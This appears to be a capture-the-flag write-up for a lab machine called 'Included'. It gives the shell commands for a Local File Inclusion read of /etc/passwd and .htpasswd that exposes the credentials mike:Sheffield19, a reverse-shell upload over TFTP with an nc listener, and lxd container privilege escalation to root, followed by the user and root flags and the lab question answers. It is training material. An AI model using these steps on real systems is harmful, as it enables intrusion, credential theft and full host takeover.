# Included - Very Easy

```shell
rustscan -a 10.129.195.90 --range 0-65535 --ulimit 5000 -- -sV

sudo nmap 10.129.195.90 -sU -p 1-100
#for udp scan
#slow

tftp 10.129.195.90

put reverse-shell.php

quit

#setup listener and access uploaded payload
nc -nvlp 4444

#after getting reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

su mike
#using mike's creds found in .htpasswd

cd

cat user.txt

id
#we are part of lxd group

#we can transfer pre-built alpine tar file from attacker machine
#on attacker machine
python3 -m http.server

#on victim machine
cd /tmp

wget http://10.10.14.40:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

lxc image list

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh
#this gives us root shell

id
#root

cd /mnt/root/root

cat root.txt
```

```markdown
Open ports & services:

  * 80 (tcp) - http
  * 69 (udp) - tftp

Checking the webpage on port 80, we can see that it uses the query '/?file=home.php'

This can be vulnerable to LFI, we can check for /etc/passwd file as a proof of concept.

Using Burp Suite to first intercept the request and send it to repeater, we can experiment with different payloads.

Using the payload '/?file=../../../etc/passwd' works, so we can now enumerate and look for files that can help us in lateral movement.

Now, we know that .htpasswd is usually located in /var/www/html and can be used for lateral movement; we can get this file using LFI.

By printing .htpasswd using LFI, we get the creds mike:Sheffield19.

As we have TFTP on port 69 in victim machine, we can use that to upload reverse shell payload from our machine.

After uploading the payload, we need to setup listener and access the payload on web to get reverse shell; we can do so by visiting this link

    /?file=../../../var/lib/tftpboot/reverse-shell.php

Now we get reverse shell; after upgrading it we can switch to user Mike.

We can see that using 'id', we are part of lxd group; this can be exploited.

By Googling 'lxd privesc exploit', we get multiple articles which explain the privilege escalation process, we can follow those.

Once we complete all the steps, we get root.
```

1. What service is running on the target machine over UDP? - tftp

2. What class of vulnerability is the webpage that is hosted on port 80 vulnerable to? - Local File Inclusion

3. What is the default system fodler that TFTP uses to store files? - /var/lib/tftpboot/

4. Which interesting file is located in the web server folder and can be used for Lateral Movement? - .htpasswd

5. What is the group that user Mike is a part of and can be exploited for Privilege Escalation? - lxd

6. When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name? - Alpine

7. What flag do we set to the container so that it has root privileges on the host system? - security.privileged=true

8. If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted? - /mnt/root/

9. Submit user flag - a56ef91d70cfbf2cdb8f454c006935a1

10. Submit root flag - c693d9c7499d9f572ee375d4c14c7bcf
